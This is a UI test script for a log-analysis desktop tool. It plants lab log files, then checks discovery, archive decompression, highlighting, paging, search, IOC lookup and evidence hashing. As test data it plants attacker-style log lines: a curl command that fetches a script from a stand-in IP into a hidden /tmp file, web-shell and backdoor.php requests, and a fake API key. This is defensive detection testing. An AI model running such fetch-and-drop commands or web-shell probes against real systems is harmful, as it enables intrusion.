// Drives the log page in the real window: opens a source, checks that the
// parts of a line worth finding again are marked, and that paging says where
// you are and lets you go somewhere else.
//
//   node tools/lab/probe-ui-log-analysis.mjs
//   LAB=alpine node tools/lab/probe-ui-log-analysis.mjs
import { execFileSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";

import { startDesktop } from "./desktop.mjs";
import { Sidecar, connect } from "./rpc-harness.mjs";
import { labTarget } from "./lab-target.mjs";

const here = path.dirname(fileURLToPath(import.meta.url));
const repository = path.resolve(here, "..", "..");
const backend = path.join(repository, "target", "debug", "lovelyhawk-backend.exe");
const which = process.env.LAB ?? "ubuntu";
const container = `lab-${which}`;
const port = Number(process.env.LAB_UI_PORT ?? 9350);
/** Planted under an application directory, which /var/log-only discovery missed. */
const LOG_DIR = "/opt/probe-app/logs";
const LOG_FILE = `${LOG_DIR}/app.log`;

let failures = 0;
function check(name, actual, expected = true) {
  const ok = actual === expected;
  if (!ok) failures += 1;
  console.log(`  ${ok ? "PASS" : "FAIL"} ${name}${ok ? "" : `\n       expected ${JSON.stringify(expected)}\n       actual   ${JSON.stringify(actual)}`}`);
}

function onHost(command) {
  const quoted = `'${command.replace(/'/gu, `'\\''`)}'`;
  return execFileSync(
    "wsl.exe",
    ["-d", "Ubuntu", "-u", "root", "-e", "bash", "-lc", `docker exec ${container} sh -c ${quoted}`],
    { encoding: "utf8" },
  ).split("\0").join("").trim();
}

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

async function waitFor(session, expression, label, attempts = 120) {
  for (let attempt = 0; attempt < attempts; attempt += 1) {
    if (await session.evaluate(expression) === true) return;
    await sleep(500);
  }
  throw new Error(`timed out waiting for ${label}`);
}

/**
 * Opens one source and does not return until the detail pane is showing it.
 *
 * Pressing "read" straight after the click tests nothing: if the click missed,
 * the button reads whatever was selected before and the run still looks
 * plausible. Confirming the selection first is what makes the read meaningful.
 */
async function openSource(session, location) {
  const clicked = await session.evaluate(`(() => {
    const button = [...document.querySelectorAll('.log-analysis-source, aside button')]
      .find(b => b.textContent.includes(${JSON.stringify(location)}));
    if (button === undefined) return false;
    button.click();
    return true;
  })()`);
  if (clicked !== true) throw new Error(`no source button offered ${location}`);
  await waitFor(
    session,
    `document.querySelector('.log-analysis-detail p')?.textContent.includes(${JSON.stringify(location)}) === true`,
    `${location} to become the open source`,
    60,
  );
}

const evidence = path.join(repository, "target", "lab-ui-log-analysis", which);
fs.mkdirSync(evidence, { recursive: true });
async function shot(session, name) {
  const { data } = await session.send("Page.captureScreenshot", { format: "png" });
  const file = path.join(evidence, `${name}.png`);
  fs.writeFileSync(file, Buffer.from(data, "base64"));
  console.log(`      saved ${file}`);
}

const dataRoot = fs.mkdtempSync(path.join(os.tmpdir(), "lovelyhawk-ui-log-"));
const keptRoot = path.join(evidence, `kept-${Date.now()}`);
fs.mkdirSync(keptRoot, { recursive: true });
let app;
let session;
try {
  // 250 lines so paging has somewhere to go, with the three kinds of thing
  // the line marker is supposed to find scattered through it.
  onHost(`mkdir -p ${LOG_DIR}; i=1; : > ${LOG_FILE}; while [ $i -le 250 ]; do case $i in 7) echo "2026-09-03 login failed password for root from 203.0.113.7";; 120) echo "2026-09-03 fetch: curl http://198.51.100.7/x.sh -o /tmp/.x";; 240) echo "2026-09-03 config api_key=AKIA0123456789 loaded";; *) echo "2026-09-03 request $i ok";; esac; i=$((i+1)); done >> ${LOG_FILE}; wc -l < ${LOG_FILE}`);
  console.log(`  planted ${LOG_FILE}`);
  // What a web host actually writes. Not one of these ends in .log, which is
  // why the tab used to show none of them.
  onHost(
    `mkdir -p /var/log/httpd /usr/local/tomcat/logs /www/wwwlogs;`
    + ` printf '%s\\n' '203.0.113.9 - - [03/Sep/2026:10:00:01 +0800] "GET /shell.jsp?cmd=id HTTP/1.1" 200 31'`
    + ` > /var/log/httpd/access_log;`
    + ` printf '%s\\n' '03-Sep-2026 10:00:02 INFO [main] deploying webapp /uploads/x.war' `
    + ` > /usr/local/tomcat/logs/catalina.out;`
    + ` printf '%s\\n' '198.51.100.4 - - [03/Sep/2026:10:00:03 +0800] "POST /wp-admin/x.php HTTP/1.1" 200 12'`
    + ` > /www/wwwlogs/site.com.log;`
    + ` ls -1 /var/log/httpd /usr/local/tomcat/logs /www/wwwlogs`,
  );
  console.log("  planted an Apache access_log, a catalina.out and a panel site log");
  // Yesterday's log, as each family's logrotate leaves it. The evidence line
  // exists only inside the archive, so finding it proves the read decompressed.
  onHost(
    `mkdir -p /var/log/nginx;`
    + ` printf '%s\\n' 'Sep  2 03:11:02 host sshd[1]: Accepted password for root from 198.51.100.77'`
    + ` > /var/log/secure-20260902;`
    // A source tarball in a log root must stay out of the list.
    + ` printf '%s' x > /var/log/sources.tar.gz`,
  );
  // Compressed on the WSL host and streamed in, because the machine under test
  // is allowed not to have gzip — one of the nine does not, and that is the
  // case worth covering rather than skipping.
  execFileSync(
    "wsl.exe",
    ["-d", "Ubuntu", "-u", "root", "-e", "bash", "-lc",
      `printf '%s\\n' 'ROTATED 198.51.100.77 - - "GET /uploads/backdoor.php" 200 9' | gzip -c`
      + ` | docker exec -i ${container} sh -c 'cat > /var/log/nginx/access.log.1.gz'`],
    { encoding: "utf8" },
  );
  const hasGzip = onHost("command -v gzip >/dev/null 2>&1 && echo yes || echo no") === "yes";
  console.log(`  planted a rotated .gz, an RPM-style rotation and a decoy tarball (gzip on target: ${hasGzip})`);

  const sidecar = new Sidecar(backend, dataRoot);
  try {
    const status = await connect(sidecar, labTarget(which));
    if (status.stage !== "connected") throw new Error(JSON.stringify(status));
  } finally { sidecar.close(); }

  // Keeping the application log as evidence asks the host for a folder once;
  // the debug build answers it with this run's own directory.
  app = await startDesktop({ dataRoot, port, dialogAnswers: [keptRoot], clipboard: true });
  session = app.session;
  await waitFor(session, "document.querySelector('.connection-card') !== null", "the connection list");
  await session.evaluate(`(() => { const c = document.querySelector('.connection-card'); c?.querySelector('button')?.click() ?? c?.click(); return true; })()`);
  await waitFor(session, "document.querySelector('.nav-item') !== null", "the connected shell");
  await session.evaluate(`(() => { [...document.querySelectorAll('.nav-item')].find(n => n.textContent?.includes('日志分析'))?.click(); return true; })()`);
  await waitFor(session, "document.querySelector('.log-analysis-page') !== null", "the log page");

  // The planted file lives outside /var/log, which used to be unreachable.
  await waitFor(session, `document.body.textContent.includes('probe-app')`, "the application log source", 240);
  check("a log outside /var/log is offered as a source", true);

  // The web application's own logs, none of which are named *.log.
  const web = await session.evaluate(`(() => {
    const text = document.querySelector('.log-analysis-page')?.textContent ?? '';
    return {
      apache: text.includes('/var/log/httpd/access_log'),
      tomcat: text.includes('catalina.out'),
      panel: text.includes('/www/wwwlogs/site.com.log'),
    };
  })()`);
  console.log(`  web sources: ${JSON.stringify(web)}`);
  check("an Apache access_log with no extension is offered", web.apache);
  check("a Tomcat catalina.out is offered", web.tomcat);
  check("a panel site log under /www is offered", web.panel);

  // Offered is not the same as readable: open the one with no extension and
  // read it, which is the half of "cannot read the web application" that a
  // longer source list would not have fixed.
  await openSource(session, "/var/log/httpd/access_log");
  await session.evaluate(`(() => { document.querySelector('.log-analysis-run')?.click(); return true; })()`);
  try {
    await waitFor(session, `document.querySelector('.log-analysis-lines')?.textContent.includes('shell.jsp') === true`,
      "the Apache line", 240);
  } catch (error) {
    // Say why, not just that: a timeout with no state tells the next reader
    // nothing about whether the read failed, the wrong source was opened, or
    // the machine was simply slow.
    console.log(`      page state: ${JSON.stringify(await session.evaluate(`(() => ({
      selected: document.querySelector('.log-analysis-detail h2')?.textContent ?? null,
      location: document.querySelector('.log-analysis-detail p')?.textContent ?? null,
      status: document.querySelector('.log-analysis-status')?.textContent ?? null,
      error: document.querySelector('[role="alert"]')?.textContent ?? null,
      lines: document.querySelectorAll('.log-analysis-lines p').length,
      empty: document.querySelector('.log-analysis-empty')?.textContent ?? null,
    }))()`))}`);
    await shot(session, "web-access-log-timeout");
    throw error;
  }
  check("the Apache log actually opens and shows its line", true);
  await shot(session, "web-access-log");

  // Yesterday's log. Listed, labelled as an archive, and actually decompressed
  // — the line it proves exists nowhere outside the .gz.
  const archives = await session.evaluate(`(() => {
    const text = document.querySelector('.log-analysis-page')?.textContent ?? '';
    return {
      gz: text.includes('access.log.1.gz'),
      rpm: text.includes('secure-20260902'),
      tarball: text.includes('sources.tar.gz'),
    };
  })()`);
  console.log(`  archives: ${JSON.stringify(archives)}`);
  check("a rotated .gz is offered", archives.gz);
  check("an RPM-style rotation with no extension is offered", archives.rpm);
  check("a source tarball is not mistaken for a log", archives.tarball, false);

  await openSource(session, "/var/log/nginx/access.log.1.gz");
  const labelled = await session.evaluate(
    "document.querySelector('.log-analysis-facts')?.textContent ?? ''",
  );
  console.log(`  archive facts: ${JSON.stringify(labelled)}`);
  check("the archive says its size is the compressed one", labelled.includes("压缩后大小"));
  check("and that reading it decompresses", labelled.includes("解压后按页读取"));

  await session.evaluate(`(() => { document.querySelector('.log-analysis-run')?.click(); return true; })()`);
  if (hasGzip) {
    await waitFor(session, `document.querySelector('.log-analysis-lines')?.textContent.includes('backdoor.php') === true`,
      "the decompressed archive line", 240);
    check("the archive is decompressed and read, not shown as binary", true);
    const binary = await session.evaluate(
      "/[\\u0000-\\u0008]/u.test(document.querySelector('.log-analysis-lines')?.textContent ?? '')",
    );
    check("no raw compressed bytes reached the screen", binary, false);
  } else {
    // Nothing to open it with. An empty page here would read as "this archive
    // holds nothing", which is the wrong answer about a file that does.
    await waitFor(session, `document.querySelector('[role="alert"]')?.textContent.includes('gzip') === true`,
      "the missing-tool message", 240);
    const said = await session.evaluate(`document.querySelector('[role="alert"]')?.textContent ?? ''`);
    console.log(`  no gzip on this machine, page says: ${JSON.stringify(said)}`);
    check("it says the machine has no gzip instead of showing an empty page", said.includes("没有 gzip"));
    check("and it says what to do about it", said.includes("解压"));
  }
  await shot(session, "archived-log");

  await openSource(session, LOG_FILE);
  check("the application log can be opened", true);
  // Reading is an explicit act, the way it is for an operator.
  await session.evaluate(`(() => {
    const run = document.querySelector('.log-analysis-run');
    run?.click();
    return true;
  })()`);
  try {
    await waitFor(session, "document.querySelector('.log-analysis-lines p') !== null", "the log lines", 240);
  } catch (error) {
    const state = await session.evaluate(`(() => ({
      status: document.querySelector('.log-analysis-status')?.textContent ?? null,
      error: document.querySelector('.log-analysis-error, [role="alert"]')?.textContent ?? null,
      empty: document.querySelector('.log-analysis-empty')?.textContent ?? null,
      selected: document.querySelector('.log-analysis-source.is-selected, button[aria-pressed="true"]')?.textContent ?? null,
      body: document.querySelector('.log-analysis-page')?.textContent?.slice(0, 400) ?? null,
    }))()`);
    console.log(`      page state: ${JSON.stringify(state)}`);
    await shot(session, "log-lines-timeout");
    throw error;
  }

  const marks = await session.evaluate(`(() => {
    const all = [...document.querySelectorAll('.log-analysis-mark')];
    return { count: all.length, kinds: [...new Set(all.map(m => m.className.replace('log-analysis-mark is-','')))].sort(),
             samples: all.slice(0, 4).map(m => m.textContent) };
  })()`);
  console.log(`  marks: ${JSON.stringify(marks)}`);
  check("sensitive content is marked in place", marks.count > 0);

  const summary = await session.evaluate(
    "document.querySelector('[data-testid=\"log-pagination-summary\"]')?.textContent ?? null",
  );
  console.log(`  pagination: ${summary}`);
  check("the pager says which page and how many", typeof summary === "string" && summary.includes("第 1 页"));
  check("it reports the count", typeof summary === "string" && /条/u.test(summary));
  check("a page jump box is offered", await session.evaluate(
    "document.querySelector('.log-analysis-jump input') !== null"));
  await shot(session, "log-page-1");

  // Jump to page 3 by typing it, the way an operator would.
  await session.evaluate(`(() => {
    const input = document.querySelector('.log-analysis-jump input');
    const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
    setter.call(input, '3');
    input.dispatchEvent(new Event('input', { bubbles: true }));
    const go = [...document.querySelectorAll('.log-analysis-pagination button')].find(b => b.textContent.includes('跳转'));
    go.click();
    return true;
  })()`);
  await waitFor(session, `document.querySelector('[data-testid="log-pagination-summary"]')?.textContent.includes('第 3 页') === true`,
    "the jumped page", 240);
  const jumped = await session.evaluate(
    "document.querySelector('[data-testid=\"log-pagination-summary\"]').textContent");
  console.log(`  after jump: ${jumped}`);
  check("the jump landed on the asked-for page", jumped.includes("第 3 页"));
  await shot(session, "log-page-3");

  // Searching reaches the whole file, not just the page on screen.
  const beforeSearch = await session.evaluate(
    "document.querySelector('[data-testid=\"log-pagination-summary\"]')?.textContent ?? ''",
  );
  await session.evaluate(`(() => {
    const input = [...document.querySelectorAll('.log-analysis-query input')].find(i => i.placeholder?.includes('单行'))
      ?? document.querySelector('.log-analysis-query input');
    const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
    setter.call(input, 'api_key');
    input.dispatchEvent(new Event('input', { bubbles: true }));
    document.querySelector('.log-analysis-run')?.click();
    return true;
  })()`);
  // Wait for the answer rather than for a guess at how long it takes: an RPM
  // machine spends eleven seconds on every command, and a fixed four-second
  // sleep read an empty page there and called the search broken.
  await waitFor(
    session,
    `(() => {
      const running = document.querySelector('.log-analysis-run')?.textContent?.includes('读取中') === true;
      const summary = document.querySelector('[data-testid="log-pagination-summary"]')?.textContent ?? '';
      return !running && summary !== '' && summary !== ${JSON.stringify(beforeSearch)};
    })()`,
    "the search to come back",
    240,
  );
  const searched = await session.evaluate(`(() => ({
    lines: document.querySelectorAll('.log-analysis-lines p').length,
    text: document.querySelector('.log-analysis-lines')?.textContent?.slice(0, 200) ?? '',
    summary: document.querySelector('[data-testid="log-pagination-summary"]')?.textContent ?? '',
  }))()`);
  console.log(`  after search: ${JSON.stringify(searched).slice(0, 260)}`);
  // The keyword sits on line 240 of 250, so it is not on the page that was
  // showing when the search was typed — finding it is the whole point.
  check("the search found the line and reset to the first page", searched.summary.includes("第 1 页"));
  check("only matching lines came back", searched.lines, 1);
  check("the match is the planted one", searched.text.includes("api_key"));
  await shot(session, "log-search");

  // Copying the result: a plain-text report of what was read, from where,
  // under which conditions and when, through the host clipboard.
  app.clearClipboard();
  await session.evaluate("document.querySelector('[data-testid=\"log-analysis-copy\"]').click(), true");
  await waitFor(session, "document.querySelector('.log-analysis-result-actions p')?.textContent.includes('已复制') === true", "the copy notice");
  const copied = app.readClipboard() ?? "";
  console.log(`  copied report: ${JSON.stringify(copied.slice(0, 300))}`);
  check("the copy is a report of the browse view", copied.startsWith("# LovelyHawk 日志分析 · 日志浏览"));
  check("it names the time with its zone", /复制时间：\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}（本机时间，UTC[+-]\d{2}:\d{2}）/u.test(copied));
  check("it names the conditions the page was read under", copied.includes("关键词 “api_key”") && copied.includes("第 1 页"));
  check("it carries the matching line", copied.split("\n").some((line) => /^1\. .*api_key/u.test(line)));
  check("it says the read changed nothing and covers only this page", copied.includes("只读读取，没有改动目标机。") && copied.includes("不代表这个日志的全部"));
  check("the notice says what was copied", await session.evaluate("document.querySelector('.log-analysis-result-actions p').textContent"),
    "已复制本页 1 条日志和威胁摘要（纯文本）。");

  // Keeping the open log as evidence: the whole file, byte for byte, with
  // where it came from — through the same file-evidence dialog the command
  // workbench uses, by the handle discovery gave this source.
  const keep = await session.evaluate(`(() => {
    const button = document.querySelector('[data-testid="log-analysis-keep"]');
    if (button === null) return null;
    button.focus();
    button.click();
    return button.textContent.trim();
  })()`);
  check("the open log file offers to be kept as evidence", keep, "留存这个日志文件");
  await waitFor(session, "document.querySelector('.file-evidence-dialog') !== null", "the evidence dialog");
  const shownPath = await session.evaluate("document.querySelector('.file-evidence-dialog header p')?.textContent ?? ''");
  check("the evidence dialog names the log file", shownPath, LOG_FILE);
  // It once rendered as bare text under the page, its frame styles never loaded here.
  check("the evidence dialog is a modal over the page, inside the window", await session.evaluate(`(() => {
    const backdrop = document.querySelector('.emergency-path-backdrop');
    const box = document.querySelector('.file-evidence-dialog')?.getBoundingClientRect();
    return backdrop !== null && getComputedStyle(backdrop).position === 'fixed' && box !== undefined &&
      box.left >= 0 && box.top >= 0 && box.right <= innerWidth && box.bottom <= innerHeight;
  })()`), true);
  check("nothing is read before the operator asks", app.dialogAnswersLeft().length, 1);
  await session.evaluate(`(() => { [...document.querySelectorAll('.file-evidence-dialog footer button')].find(b => b.textContent.includes('选择目录并留证'))?.click(); return true; })()`);
  await waitFor(session, "document.querySelector('.file-evidence-hash') !== null", "the kept file's hash", 240);
  const keptHash = await session.evaluate("document.querySelector('.file-evidence-hash').textContent");
  const hostHash = onHost(`sha256sum ${LOG_FILE} | cut -d' ' -f1`);
  check("the kept log's hash is the one the host computes", keptHash, hostHash);
  const manifests = fs.readdirSync(keptRoot)
    .map((entry) => path.join(keptRoot, entry, "manifest.json"))
    .filter((file) => fs.existsSync(file))
    .map((file) => JSON.parse(fs.readFileSync(file, "utf8")));
  check("the kept copy records where it came from and its digest",
    manifests.length === 1 && manifests[0].observation?.remote_path === LOG_FILE && manifests[0].observation?.sha256 === hostHash, true);
  await shot(session, "log-kept");
  await session.evaluate(`(() => { [...document.querySelectorAll('.file-evidence-dialog footer button')].find(b => b.textContent.trim() === '关闭')?.click(); return true; })()`);
  await waitFor(session, "document.querySelector('.file-evidence-dialog') === null", "the evidence dialog to close");
  check("closing returns focus to the keep button", await session.evaluate("document.activeElement?.dataset.testid ?? ''"), "log-analysis-keep");

  // --- the analysis views: several sources at once, and their copies.
  const selectView = (label) => session.evaluate(`(() => {
    const button = [...document.querySelectorAll('.log-analysis-views button')].find(b => b.textContent.trim() === ${JSON.stringify(label)});
    button?.click();
    return button !== undefined;
  })()`);
  // The source rows are the buttons in the tree that carry a source body.
  const SOURCES = "[...document.querySelectorAll('aside button')].filter(b => b.querySelector('.log-analysis-source-body') !== null)";
  const pick = (location) => session.evaluate(`(() => {
    const button = ${SOURCES}.find(b => b.textContent.includes(${JSON.stringify(location)}));
    if (button === undefined || button.disabled) return false;
    if (button.getAttribute('aria-pressed') !== 'true') button.click();
    return true;
  })()`);
  check("the correlation view opens", await selectView("多源关联"));
  // Start from nothing chosen, so the run covers exactly the two named here.
  await session.evaluate(`(() => { for (const button of ${SOURCES}) if (button.getAttribute('aria-pressed') === 'true') button.click(); return true; })()`);
  const picked = [await pick("/opt/probe-app/logs/app.log"), await pick("/www/wwwlogs/site.com.log")];
  if (picked.includes(false)) {
    console.log(`  sources: ${JSON.stringify(await session.evaluate(`${SOURCES}.map(b => [b.textContent.slice(0, 60), b.getAttribute('aria-pressed'), b.disabled])`))}`);
  }
  check("two planted logs can be chosen for it", picked.every(Boolean));
  await session.evaluate("document.querySelector('.log-analysis-run').click(), true");
  await waitFor(session, "document.querySelector('.log-analysis-coverage') !== null || document.querySelector('.log-analysis-detail [role=alert]') !== null", "the correlation", 240);
  const correlated = await session.evaluate(`(() => ({
    coverage: document.querySelector('.log-analysis-coverage')?.textContent ?? null,
    lines: document.querySelectorAll('.log-analysis-lines p').length,
    error: document.querySelector('.log-analysis-detail [role=alert]')?.textContent ?? null,
  }))()`);
  console.log(`  correlation: ${JSON.stringify(correlated)}`);
  check("the two logs are read together", correlated.coverage !== null && correlated.lines > 0);
  app.clearClipboard();
  await session.evaluate("document.querySelector('[data-testid=\"log-analysis-copy\"]').click(), true");
  await waitFor(session, "document.querySelector('.log-analysis-result-actions p')?.textContent.includes('已复制') === true", "the correlation copy");
  const correlationCopy = app.readClipboard() ?? "";
  check("its copy names both sources and its bound",
    correlationCopy.startsWith("# LovelyHawk 日志分析 · 多源关联") &&
      correlationCopy.includes("日志源（2 个）：") && correlationCopy.includes("/opt/probe-app/logs/app.log") &&
      correlationCopy.includes("/www/wwwlogs/site.com.log") && correlationCopy.includes("每源最多观察 200 行"));
  await shot(session, "log-correlation");

  check("the IOC view opens", await selectView("IOC 搜索"));
  // The selection carries over from the correlation view; the IOC search
  // runs over the same two logs.
  await session.evaluate(`(() => {
    const area = document.querySelector('.log-analysis-ioc-input textarea');
    const setter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, 'value').set;
    setter.call(area, 'api_key\\n198.51.100.254');
    area.dispatchEvent(new Event('input', { bubbles: true }));
    return true;
  })()`);
  await session.evaluate("document.querySelector('.log-analysis-run').click(), true");
  await waitFor(session, "document.querySelector('.log-analysis-ioc-results') !== null || document.querySelector('.log-analysis-detail [role=alert]') !== null", "the IOC search", 240);
  app.clearClipboard();
  await session.evaluate("document.querySelector('[data-testid=\"log-analysis-copy\"]').click(), true");
  await waitFor(session, "document.querySelector('.log-analysis-result-actions p')?.textContent.includes('已复制') === true", "the IOC copy");
  const iocCopy = app.readClipboard() ?? "";
  console.log(`  IOC copy: ${JSON.stringify(iocCopy.slice(0, 400))}`);
  check("the IOC copy lists what was searched", iocCopy.startsWith("# LovelyHawk 日志分析 · IOC 搜索") && iocCopy.includes("IOC（2 个）：api_key、198.51.100.254"));
  check("it shows where the planted indicator was found", /- api_key @ [^\n]*app\.log[^\n]*：\d+ 次/u.test(iocCopy));
  check("and names the one found nowhere", iocCopy.includes("没有命中：198.51.100.254"));
  await shot(session, "log-ioc");
} catch (error) {
  console.log(`FAILED: ${error.message}`);
  failures += 1;
} finally {
  await app?.close();
  try {
    onHost(
      "rm -rf /opt/probe-app /www/wwwlogs/site.com.log /var/log/httpd/access_log"
      + " /usr/local/tomcat/logs/catalina.out /var/log/nginx/access.log.1.gz"
      + " /var/log/secure-20260902 /var/log/sources.tar.gz /tmp/rot.log.gz",
    );
  } catch {}
  fs.rmSync(dataRoot, { recursive: true, force: true, maxRetries: 10, retryDelay: 300 });
}

console.log(`\n${failures === 0 ? "ALL CHECKS PASSED" : `${failures} CHECK(S) FAILED`}`);
process.exitCode = failures === 0 ? 0 : 1;
